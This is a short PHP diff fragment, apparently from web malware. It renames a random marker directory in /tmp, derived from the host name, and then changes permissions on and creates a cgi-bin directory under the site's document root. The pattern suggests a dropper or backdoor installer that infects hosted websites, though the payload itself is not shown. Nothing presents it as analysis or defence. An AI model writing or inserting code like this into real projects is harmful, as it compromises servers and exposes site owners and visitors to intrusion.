@@ -22,8 +22,8 @@ die();  }
 
 $random = rand(1,6);
 $d=$_SERVER['HTTP_HOST'];
-if(file_exists('/tmp/3223ffffczc'.$d.$random)) { } else {
-	mkdir('/tmp/3223ffffczc'.$d.$random);
+if(file_exists('/tmp/d2d2vssdfdsfsd'.$d.$random)) { } else {
+	mkdir('/tmp/d2d2vssdfdsfsd'.$d.$random);
 	@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
